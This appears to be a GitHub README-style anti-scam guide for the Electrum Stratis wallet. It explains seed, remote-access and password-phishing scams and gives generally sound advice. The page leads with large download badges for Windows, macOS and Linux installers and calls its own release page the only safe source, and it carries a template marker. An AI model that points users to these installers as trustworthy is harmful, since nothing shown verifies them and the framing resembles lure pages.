![Electrum-Stratis](assets/banner-article.png)

# The scam variants aimed at wallet holders, and the one test that stops them all

<p align="center">Six scripts, one request</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Every variant - fake support, fake migration, fake recovery, fake giveaway, fake update - needs the same thing from you: a seed, a private key, a wallet file or a remote connection. Refuse that one request and the variant does not matter; the scripts change, the ask does not. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and it has no support channel that would ever need any of those four.

## You'll see this if

<div align="center">

| The approach | What it looks like | What it wants |
|---|---|---|
| Fake support | A reply to your post, offering to help | Remote access or the file |
| Fake migration | A deadline to "swap" your coins | The seed phrase |
| Fake recovery | A service that promises to restore funds | A fee, then the seed |
| Fake giveaway | Double your deposit | A deposit |
| Fake update | A build from an unknown host | Installation of malware |
| Fake wallet app | A store listing with the right name | The seed at first run |

</div>

The surface differs every time; the target is always the same key material, because that is the only thing that can move coins.

## Why it happens

Self-custody removes the intermediary, and with it the intermediary's ability to reverse anything. A scammer does not need to break the wallet; they need you to hand over the key, and the absence of a support desk makes impersonating one cheap. There is no number to call and check, which is exactly the gap the scripts fill.

The other half is search. A person with a problem searches for a solution, and the results include paid placements, lookalike domains and videos describing procedures that require a seed. The advice looks helpful because it is written to look helpful; the tell is not tone but the ask. The wallet is actively maintained, and no build of it asks for a seed, a key or remote access; the current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19). That is why a request for any of the three is impersonation rather than functionality, whatever page it arrives on.

Password phishing is the variant that gets least attention and works best on careful people. A page that looks like the wallet's unlock screen, a dialog that claims the file is "corrupted" and needs the password to repair, a message offering to reset a password that no server holds - all of them are asking for the one secret that unlocks the encrypted file, and all of them describe a service that does not exist. There is no password reset in a self-custody wallet, because there is no account to reset; the file opens with the password you chose, or it does not open at all. The same rule applies as everywhere else: a prompt is legitimate only if you opened the application and it is the application's own window, which is also the test for [Electrum Stratis password prompts](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-prompts-you-never-set.md).

## Fix

1. **Apply the test before reading further.** Does the interaction end with you revealing a seed, a key, a file or a screen? If yes, it is a scam regardless of how professional it looks.
2. **Never install a build from a link someone sent.** Get it from the release page, verify the hash, and treat every other source as hostile, including stores and mirrors.
3. **Do not accept remote help.** A person who needs to see your screen while the wallet is open has access to everything the wallet can do.
4. **Check the domain, not the design.** A page that copies the layout perfectly is still a page on a domain that is not the project's.
5. **Slow down when there is a deadline.** Urgency is manufactured; a real process does not expire in ten minutes, and a real migration never needed a phrase at all.

If a seed was already entered, the response is not argument but action: new wallet, new phrase, sweep the balance.

## If that did not work

If money has already been sent, document it: addresses, transaction IDs, timestamps, the conversation, the domain. That record is what a report needs, and it is the only thing that can help later.

If a fake app is installed, treat the machine as compromised rather than the wallet alone. A build that asked for a phrase at first run has had access to everything typed since.

If the approach came through a platform's messaging, report the account there as well; the same script usually runs across many targets, and the account is the part that can actually be removed.

## Prevention

- Never enter a seed except in a restore you started.
- Download only from the release page, and verify the hash.
- No remote access, no screen sharing, no "let me look".
- Treat deadlines as evidence of fraud.
- Tell one other holder the test; it is more useful than a warning about a specific script.

## FAQ

### How do I know a message is a scam?

By what it asks for, not how it reads. Any request for a seed, a private key, a wallet file or remote access is fraudulent, whoever sends it and however official the name looks. Legitimate help never needs any of the four.

### Are there fake versions of this wallet?

Yes - lookalike pages and store listings borrow the name, and their installers do not match the published checksum. The defence is procedural: download from the release page, verify the hash, and ignore every other source.

### Someone offered to recover my funds for a fee. Should I pay?

No. A signed transaction cannot be reversed by anyone, so a fee buys nothing except a second request, usually for the seed. The offer itself is the evidence that the counterparty is not what they claim.

### What should I do after being scammed?

Stop engaging, secure anything not yet exposed, and document everything: addresses, transaction IDs, timestamps, messages, domains. Report it to the platform and to the authorities your jurisdiction provides; recovery claims from third parties are a second scam.

<!-- DOWNLOAD-BLOCK -->

When you find one, keep the evidence: the message, the address it asked you to pay, the profile that sent it. Report it to the platform, warn the community it is targeting, and do not reply to negotiate. Engagement confirms the address is live and marks you as someone who answers, which is the only thing the sender was testing.

## Related articles

- [Crypto recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
- [Seed entry was never necessary](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-no-flow-needs-a-seed.md)
- [Stratis wallet login pages that do not exist](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/there-is-no-login-page.md)
- [What can be stolen from a wallet](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-a-thief-can-actually-take.md)
